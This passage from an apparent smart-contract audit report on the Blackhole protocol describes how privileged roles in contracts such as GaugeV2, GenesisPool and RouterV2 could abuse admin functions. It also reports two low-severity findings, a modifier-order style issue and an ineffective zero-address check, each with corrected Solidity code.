</ul>
</li>
<li>
<p><strong>GaugeAdmin:</strong> The GaugeAdmin has the ability to <code>setBribeFactory</code>, <code>setPermissionsRegistry</code>, <code>setVoter</code>, <code>setGenesisManager</code>, <code>setBlackGovernor</code>, <code>setFarmingParam</code>, <code>setNewBribes</code>, <code>setInternalBribeFor</code>, <code>setExternalBribeFor</code>, <code>setMinter</code>, <code>addGaugeFactory</code>, <code>replaceGaugeFactory</code>, <code>removeGaugeFactory</code>, <code>addPairFactory</code>, <code>replacePairFactory</code>, <code>removePairFactory</code>, <code>acceptAlgebraFeeChangeProposal</code>. Here’s how he can misuse his power:</p>
<ul>
<li>Misuse critical functions: A malicious or compromised admin, having exclusive access to these functions, can misuse their powers by arbitrarily setting or replacing critical contract components such as the minter, gauge factories, and pair factories, which control key protocol behaviors like minting and gauge creation. By setting a malicious minter or injecting compromised factories, the admin could mint unlimited tokens, manipulate liquidity incentives, or redirect funds. Furthermore, the admin can unilaterally accept fee changes on Algebra pools, potentially increasing fees or redirecting revenue without community consent.</li>
<li>Arbitrarily change addresses: They can arbitrarily change the addresses of key farming contracts (<code>farmingCenter</code>, <code>algebraEternalFarming</code>, <code>nfpm</code>), potentially redirecting farming rewards or incentives to malicious contracts. Additionally, by setting or replacing internal and external bribes on any gauge, the admin can manipulate voting incentives and reward distributions, possibly favoring certain participants or contracts unfairly. Since these settings directly influence how rewards and incentives flow within the protocol, the admin’s unchecked ability to alter them creates a significant risk of abuse, including funneling rewards to themselves or collaborators, destabilizing the ecosystem, and undermining user trust.</li>
<li>Admin replaces the Bribe Factory and Permission Registry with malicious contracts: The admin, having full control, sets the <code>bribefactory</code> to a malicious contract they control. This fake bribe factory redirects all bribe rewards intended for legitimate liquidity providers or voters to the admin’s own address. Meanwhile, the admin also replaces the <code>permissionRegistry</code> with a contract that falsely approves only their own addresses or bots for privileged actions, effectively locking out honest participants. With the voter contract replaced by one that the admin controls, they can manipulate governance votes or decisions, passing proposals that benefit themselves or their allies, like lowering fees or minting tokens unfairly. At the same time, the admin sets <code>blackGovernor</code> to their own address, giving them the power to block or censor any proposals or actions from other users, consolidating full control over governance.</li>
</ul>
</li>
<li>
<p><strong>Governance:</strong> The governance role has the ability to revive and kill a gauge. Here’s how he can misuse his powers:</p>
<ul>
<li>Kill gauges with malicious intent: A malicious governance actor can intentionally kill legitimate gauges under the pretense that they are “malicious”, using the <code>killGauge</code> function. Since there is no on-chain validation of malicious behavior in the function itself, just a check that <code>isAlive[_gauge]</code> is true—they can arbitrarily target any active gauge.</li>
</ul>
</li>
</ul>
<p><strong>10. In the GaugeV2.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to <code>setDistribution</code>, <code>setGaugeRewarder</code>, <code>setInternalBribe</code>, <code>activateEmergencyMode</code>, <code>stopEmergencyMode</code> and <code>setGenesisPoolManager</code>. Here’s how he can misuse his powers;</p>
<ul>
<li>A malicious owner could stealthily redirect critical reward and bribe flows to attacker-controlled contracts by setting the internal bribe, gauge rewarder, and distribution addresses to malicious contracts. They could also consolidate control by assigning the genesis pool manager to themselves or colluding contracts, gaining influence over early-stage pools and rewards. Additionally, the owner can arbitrarily trigger and stop emergency mode, halting or manipulating protocol operations to stall users while executing self-serving upgrades or migrations. This unchecked power enables fund diversion, governance capture, loss of user trust, and backdoor control of key system parameters without any DAO or governance oversight, posing severe risks to protocol integrity and participant fairness.</li>
</ul>
</li>
<li>
<p><strong>GenesisManager:</strong> The GenesisManager has the ability to set pools, Here’s how he can misuse his power:</p>
<ul>
<li>Setting as <code>address(0)</code>: A compromised or malicious owner can set the Genesis Pool Manager to the zero address (<code>address(0)</code>), as the <code>setGenesisPoolManager()</code> function lacks a validation check to prevent this. This could disable or break core protocol functionality that depends on the genesis manager.</li>
</ul>
</li>
</ul>
<p><strong>11. In the GenesisPool.sol contract</strong></p>
<ul>
<li>
<p><strong>genesisManager:</strong> The genesisManager has the ability to <code>setGenesisPoolInfo</code>, <code>rejectPool</code>, <code>approvePool</code>, <code>depositToken</code>, <code>transferIncentives</code>, <code>setPoolStatus</code>, <code>launch</code>, <code>setAuction</code>, <code>setMaturityTime</code> and <code>setStartTime</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>Set arbitrary parameters: The manager can misuse their role in <code>setGenesisPoolInfo</code> by providing malicious or incorrect input values since the function lacks proper input validation checks on critical parameters such as <code>genesisInfo</code>, <code>allocationInfo</code>, and <code>auction</code>. This enables the manager to set arbitrary genesis configurations, manipulate token allocation amounts, or assign a malicious <code>auction</code> contract that could siphon funds or behave unfairly.</li>
<li>Reject pools arbitrarily: The manager can call <code>rejectPool()</code> to mark any pool as <code>NOT_QUALIFIED</code> prematurely, blocking legitimate pools from proceeding and unfairly refunding proposed native tokens, potentially disrupting or censoring projects.</li>
<li>Approve malicious or fake pools: Using <code>approvePool()</code>, the manager can approve pools with fake or attacker-controlled pair addresses (<code>_pairAddress</code>), enabling front-running, rug pulls, or other malicious activities disguised as legitimate pools.</li>
<li>Manipulate deposits: In <code>depositToken()</code>, the manager controls when deposits are accepted (by controlling <code>poolStatus</code> and <code>genesisInfo.startTime</code>) and can arbitrarily restrict or allow deposits, effectively censoring or favoring certain users.</li>
<li><code>setPoolStatus</code> to any pools without secondary authorization: The genesisManager can randomly set any pool’s status to “NOT QUALIFIED”. The protocol should implement a secondary role to make sure all interactions of genesisManager are appropriate or not.</li>
<li>Set a very high maturity: A compromised or malicious genesisManager can set a very high maturity time, the protocol does not implement an check to ensure that the maturity time is in bounds or not, making this scenario possible.</li>
</ul>
</li>
</ul>
<p><strong>12. In the GenesisPoolManager.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to set a router. Here’s how he can misuse his powers:</p>
<ul>
<li>The current implementation of the code is incorrect, it only allows <code>address(0)</code> to be passed via <code>setRouter()</code> function, already favors the compromised or malicious owner.</li>
</ul>
</li>
<li>
<p><strong>Governance:</strong> The Governance role has the ability to <code>whiteListUserAndToken</code>, <code>depositNativeToken</code>, <code>rejectGenesisPool</code>, <code>approveGenesisPool</code>, <code>setAuction</code>, <code>setEpochController</code>, <code>setMinimumDuration</code>, <code>setMinimumThreshold</code>, <code>setMaturityTime</code> and <code>setGenesisStartTime</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>Whitelisting arbitrary tokens or users (backdoor access): By calling
<code>whiteListUserAndToken</code> (<code>proposedToken</code>, <code>tokenOwner</code>), governance can whitelist unvetted or malicious tokens and users.</li>
<li>Approving fraudulent or unqualified pools: Governance can approve a genesis pool (<code>approveGenesisPool</code>) regardless of community consensus or the token’s legitimacy. The function only checks a few conditions like balance and duration, but there’s no check on project credibility or voting outcome.The Governor can even approve pools which benefits him(a cut directed to his address on every transaction that takes place.)</li>
<li>
<p>Silencing legitimate pools via rejection: By calling <code>rejectGenesisPool</code> (<code>nativeToken</code>), governance can deliberately shut down valid pools, sabotaging competitor projects.</p>
<p><em>Note: Additionally all governance functions can be executed immediately with no time lock, delay, or DAO-based confirmation.</em></p>
</li>
<li><code>setGenesisStartTime</code> to years: The compromised or malicious governor can set the genesis start time to a long duration, such that genesis never begins.</li>
</ul>
</li>
</ul>
<p><strong>13. In the MinterUpgradable.sol contract</strong></p>
<ul>
<li>
<p><strong>Team:</strong> The team role has the ability to set gauge manager and set team rate. Here’s how he can misuse his powers:</p>
<ul>
<li>Set malicious <code>gaugeManager</code> contract: A compromised or malicious user with the team role can pass in a malicious <code>gaugeManager</code> address such that it benefits him (e.g., Gauge emissions can be routed to attacker wallets).</li>
<li>Set team rate as Zero: Setting this as 0 would lead to the <code>teamEmissions</code> be transferred to the team as 0 every time <code>update_period</code> is called once every week.</li>
</ul>
</li>
</ul>
<p><strong>14. In the PermissionsRegistry.sol contract</strong></p>
<ul>
<li>
<p><strong>blackMultisig:</strong> This role has the ability to <code>addRole</code>, <code>removeRole</code>, <code>setRoleFor</code>, <code>removeRoleFrom</code>, <code>setEmergencyCouncil</code> and <code>setBlackMultisig</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>Add arbitrary roles: The multisig can create meaningless or deceptive roles like, <code>SUPER_ADMIN</code> or <code>UNLIMITED_MINTER</code> — misleading names that may imply more power. Duplicate logical roles with different names (<code>GAUGE_ADMIN</code> vs <code>GaugeAdmin</code>).</li>
<li>Assign roles to malicious addresses: Assign critical roles (e.g., <code>MINTER</code>, <code>GAUGE_ADMIN</code>, <code>ROUTER_SETTER</code>, etc.) to an EOA owned by attacker, Malicious contract or rotate them silently over time.</li>
</ul>
</li>
</ul>
<p><strong>15. In the RewardsDistributor.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to <code>setDepositor</code>, <code>withdrawERC20</code>, <code>setAVM</code> and renounce his ownership. Here’s how he can misuse his powers:</p>
<ul>
<li>Silent draining: Owner can drain any ERC-20 token held by the contract at any time, He can do this silently since no event is emitted when the owner withdraws erc20 tokens.</li>
<li>Set a malicious avm: As stated in my previous governance risks, the owner can set a malicious avm address such that it benefits him. This is a direct setting; there is no external validation by any other sources that the avm address set by the owner is actually valid or not.</li>
</ul>
</li>
</ul>
<p><strong>16. In the RouterV2.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to <code>setSwapRouter</code>, <code>setAlgebraFactory</code>, <code>setQuoterV2</code>, <code>setAlgebraPoolAPI</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>Malicious router: Owner sets <code>swapRouter</code> to a malicious contract that, front-runs user swaps by manipulating pricing logic, steals tokens during swaps by redirecting <code>transferFrom</code> to self and overrides routing logic to siphon fees to themselves.</li>
<li>Set a fake Algebra Factory: Owner sets a fake factory that, creates fake pools with manipulated or spoofed token addresses.</li>
<li>Set malicious <code>setAlgebraPoolAPI</code>: If this API contract stores sensitive pool metadata (e.g., fee config, pool status, time-weighted data). Owner can redirect it to a contract that lies about past data which could affect, time-weighted average price (TWAP), fee growth history and Oracle usage.</li>
</ul>
</li>
</ul>
<p><strong>17. In the SetterTopNPoolsStrategy.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to set a avm address. Here’s how he can misuse his powers:</p>
<ul>
<li>Set a malicious avm: As stated in my previous governance risks, the owner can set a malicious avm address such that it benefits him. This is an direct setting; there is no external validation by any other sources that the avm address set by the owner is actually valid or not.</li>
</ul>
</li>
<li>
<p><strong>Executor:</strong> The executor role has the ability to <code>setTopNPools</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>The executor sets top pools to low-volume, illiquid, or fake pools that they own or control, have no real trading activity, inflate stats or visibility. These pools could then attract volume, wrongly perceived as top pools, to receive higher incentives or emissions and trick users or LPs into providing liquidity or trading, leading to loss.</li>
</ul>
</li>
</ul>
<p><strong>18. In the Thenian.sol contract</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> The owner has the ability to withdraw, <code>setRoot</code>, <code>setNftPrice</code> and <code>reserveNFTs</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>Rug pull: Owner can withdraw all ETH (e.g. mint proceeds) to any <code>multiSig</code> they control, leaving users who paid for NFTs with nothing in return.</li>
<li>Increase price: Owner can dynamically raise the price after users are onboarded or committed, or lower the price for themselves or insiders after initial hype.</li>
<li>Owner can mint NFTs to themselves or insiders, before any public sale (sniping rare tokens), without paying in bulk to flip on secondary markets.</li>
</ul>
</li>
</ul>
<p><strong>19. In the TokenHandler.sol contract</strong></p>
<ul>
<li>
<p><strong>Governance:</strong> The governance role has the ability to <code>setPermissionsRegistry</code>, <code>whitelistTokens</code>, <code>whitelistToken</code>, <code>blacklistTokens</code>, <code>whitelistNFT</code>, <code>blacklistNFT</code>, <code>whitelistConnectors</code>, <code>whitelistConnector</code>, <code>blacklistConnector</code>, <code>setBucketType</code>, <code>updateTokenVolatilityBucket</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>The primary governance risk across these functions lies in the potential abuse of role-based control. A malicious governance actor could assign critical roles (e.g., connector tokens, whitelisted NFTs) to unauthorized or malicious addresses in exchange for bribes or personal gain. This could lead to privileged access, unfair trading advantages, or manipulation of protocol logic. Similarly, by removing or blacklisting legitimate entries, governance could censor users or competitors, undermining the fairness and neutrality of the protocol.</li>
<li><code>whitelistNFT</code>/<code>blacklistNFT</code>: The governance can misuse this by selectively whitelisting NFTs they own, allowing them to access exclusive features such as staking rewards, airdrops, or protocol privileges. Conversely, they could blacklist legitimate user NFTs to exclude them from benefits, creating unfair advantages or censorship.</li>
<li><code>whitelistConnector</code>/<code>whitelistConnectors</code>: These functions allow governance to mark certain tokens as routing connectors, which can significantly influence DEX trading paths. A malicious actor could whitelist low-liquidity, high-fee, or malicious tokens to manipulate swaps, favor certain assets, or enable exploitative routing for personal gain.</li>
<li><code>blacklistConnector</code>: By blacklisting a connector, governance can disrupt the routing mechanism and effectively remove a token from trading paths. This could be used to block competitor tokens, harm projects that don’t align with governance interests, or censor tokens used widely by users, reducing decentralization and fairness.</li>
<li><code>setBucketType</code>: This function allows governance to define or redefine the volatility bucket of tokens, potentially affecting their fee rates, risk handling, or trading logic. A dishonest actor could classify risky tokens as low-risk to game the system, offer misleading yields, or misrepresent token safety to users.</li>
</ul>
</li>
<li><strong>GenesisManager:</strong> Has similar but limited access as compared to governance. Thus, the risks remain same for both.</li>
</ul>
<p><strong>20. In the VoterV3.sol</strong></p>
<ul>
<li>
<p><strong>Owner:</strong> Does not have much access in this contract, but has the ability to set an epoch owner.</p>
<ul>
<li>Does not contain much risk (except that he can set it to a malicious address).</li>
</ul>
</li>
<li>
<p><strong>VoterAdmin:</strong> The voter admin has the ability to <code>setPermissionsRegistry</code>, <code>setMaxVotingNum</code>, <code>setAVM</code>. Here’s how he can misuse his powers:</p>
<ul>
<li>In the <code>setPermissionsRegistry</code> function, the VoterAdmin can set a new <code>permissionRegistry</code> contract. If misused, they could point it to a malicious or manipulated contract that disables or weakens access control checks. This could allow unauthorized gauge creation, voting participation, or protocol interactions that would normally be restricted, effectively undermining governance integrity and enabling privilege escalation.</li>
<li>Through the <code>setMaxVotingNum</code> function, the VoterAdmin can adjust the maximum number of pools or items a user can vote on. While this is intended for flexibility, an abusive admin could set this value excessively high or low. A very high value could spam or overload the system, potentially exhausting gas or storage, while a low value could limit voter effectiveness, censor specific users or preferences, and bias the outcome of votes.</li>
<li>The <code>setAVM</code> function allows the admin to assign the Auto Voting Manager (avm) by fetching it from the Voting Escrow contract. If <code>_ve</code> is compromised or misconfigured, this function could silently redirect AVM privileges to an untrusted actor. This risks vote automation being controlled by a malicious contract, allowing votes to be cast or overridden without user consent, compromising the fairness of governance.</li>
</ul>
</li>
<li><strong>Governance:</strong> Modifier is defined in this contract, but has no access to any of the functions.</li>
<li><strong>GenesisManager:</strong> Modifier is defined in this contract, but has no access to any of the functions.</li>
</ul>
<p><strong>21. In the VotingEscrow.sol contract</strong></p>
<ul>
<li>
<p><strong>Team:</strong> Has the ability to <code>setArtProxy</code>, <code>setAVM</code>, <code>toggleSplit</code>, <code>setSmNFTBonus</code>. Here’s how he can misuse his powers:</p>
<ul>
<li><code>setArtProxy</code> (address proxy): The team can change the art rendering proxy to a malicious or broken contract. This can result in NFTs displaying incorrect metadata or art, potentially misleading users or damaging the visual and branding integrity of the collection. If metadata is dynamic and depends on this proxy, they could also encode hidden traits, tracking, or backdoors.</li>
<li><code>setAVM</code> (address avm): By changing the Auto Voting Manager (AVM) to a manipulated contract, the team can automate votes in favor of their interests. This undermines fair governance by enabling vote hijacking, centralized decision-making, or even bribe-taking via scripted AVM behavior that does not reflect real user preferences.</li>
<li><code>toggleSplit</code> (bool state): This function may control whether NFTs can be split (e.g., fractionalized or split into sub-assets). Maliciously toggling this could disrupt NFT functionality, cause loss of composability or break integrations with platforms. Re-enabling or disabling split arbitrarily can be used to lock users out of expected functionality or manipulate secondary market behavior.</li>
<li><code>setSmNFTBonus</code> (uint bonus): This sets the bonus for special SM NFTs. If the team assigns excessively high bonuses, they can create unfair yield or voting power advantages for themselves or insiders holding those NFTs. This distorts protocol incentives and governance, allowing the team to indirectly accumulate more control or rewards.</li>
</ul>
</li>
</ul>
<h2 style="position:relative;" id="12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol"><a class="anchor before" aria-label="12 function declaration does not follow solidity style guide at fixedauctionsol permalink" href="#12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[12] Function declaration does not follow Solidity style guide at <code>FixedAuction.sol</code></h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L14">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L14</a></p>
<h3 style="position:relative;" id="finding-description-22"><a class="anchor before" aria-label="finding description 22 permalink" href="#finding-description-22"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>initialize()</code> function in the contract is written as follows:</p>
<pre data-index="88" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">initialize</span><span class="mtk1">() </span><span class="mtk11">initializer</span><span class="mtk1">  </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">__Ownable_init</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This implementation does not conform to Solidity style guide and general best practices, particularly regarding code formatting, visibility placement, and readability.</p>
<p><strong>Visibility placement order:</strong> According to the Solidity style guide (and common conventions), the order of function modifiers should follow this structure:</p>
<pre data-index="89" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> &lt;</span><span class="mtk10">name</span><span class="mtk1">&gt;(...) [</span><span class="mtk11">external</span><span class="mtk1">|</span><span class="mtk11">public</span><span class="mtk1">|</span><span class="mtk11">internal</span><span class="mtk1">|</span><span class="mtk11">private</span><span class="mtk1">] [</span><span class="mtk11">pure</span><span class="mtk1">|</span><span class="mtk11">view</span><span class="mtk1">|</span><span class="mtk11">payable</span><span class="mtk1">] [</span><span class="mtk11">modifiers</span><span class="mtk1">]</span></span></span></code></pre>
<p>In the current code, initializer is placed before public, which is unconventional and affects readability:</p>
<pre data-index="90" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">initialize</span><span class="mtk1">() </span><span class="mtk11">initializer</span><span class="mtk1"> </span><span class="mtk11">public</span><span class="mtk1"> {  </span><span class="mtk3">// Incorrect order</span></span></span></code></pre>
<h3 style="position:relative;" id="impact-22"><a class="anchor before" aria-label="impact 22 permalink" href="#impact-22"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Does not follow the official solidity’s style guide.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-34"><a class="anchor before" aria-label="recommended mitigation steps 34 permalink" href="#recommended-mitigation-steps-34"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Recommended order:</p>
<pre data-index="91" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">initialize</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">initializer</span><span class="mtk1"> {</span></span></span></code></pre>
<h2 style="position:relative;" id="13-incorrect-require-statement-for-address-check-at-gaugev2sol"><a class="anchor before" aria-label="13 incorrect require statement for address check at gaugev2sol permalink" href="#13-incorrect-require-statement-for-address-check-at-gaugev2sol"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[13] Incorrect require statement for address check at <code>GaugeV2.sol</code></h2>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeV2.sol#L139">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeV2.sol#L139</a></p>
<h3 style="position:relative;" id="finding-description-23"><a class="anchor before" aria-label="finding description 23 permalink" href="#finding-description-23"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The function <code>setInternalBribe</code> allows the contract owner to update the address of the internal bribe contract, which is used to receive fees:</p>
<pre data-index="92" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setInternalBribe</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_int</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_int</span><span class="mtk1"> &gt;= </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">); </span><span class="mtk3">//@audit incorrect require statement</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">internal_bribe</span><span class="mtk1"> = </span><span class="mtk12">_int</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>The purpose of the <code>require</code> statement is to prevent setting an invalid address, particularly the zero address, which would disable fee forwarding. However, the current implementation does allow this.</p>
<h3 style="position:relative;" id="impact-23"><a class="anchor before" aria-label="impact 23 permalink" href="#impact-23"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Ineffective validation: The condition <code>require(_int &gt;= address(0), "ZA");</code> is always true in Solidity because addresses are unsigned integers and cannot be less than zero.</li>
<li>Zero address allowed: This means the zero address (<code>address(0)</code>) can be assigned unintentionally, potentially redirecting fees to the zero address and causing permanent loss of funds.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-35"><a class="anchor before" aria-label="recommended mitigation steps 35 permalink" href="#recommended-mitigation-steps-35"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Corrected Code:</p>
<pre data-index="93" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setInternalBribe</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_int</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_int</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">); </span><span class="mtk3">// Corrected Version</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">internal_bribe</span><span class="mtk1"> = </span><span class="mtk12">_int</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<hr>
